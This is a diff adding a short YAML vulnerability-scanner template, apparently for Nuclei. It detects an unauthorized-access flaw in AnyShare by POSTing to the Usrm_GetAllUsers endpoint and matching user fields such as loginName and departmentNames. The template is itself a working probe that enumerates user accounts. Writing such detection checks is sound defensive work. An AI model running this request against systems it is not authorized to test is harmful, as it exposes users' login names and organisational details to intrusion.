@@ -1,0 +1,26 @@
+id: anyshare-usrm-getallusers-unauthorized-access
+info:
+  name: AnyShare Usrm_GetAllUsers Unauthorized Access
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: unauthorized-access
+http:
+  - method: POST
+    path:
+      - "/api/ShareMgnt/Usrm_GetAllUsers"
+    body: "[1,10]"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"loginName\""
+          - "\"directDeptInfo\""
+          - "\"departmentNames\""
+      - type: word
+        part: header
+        words:
+          - "application/json"
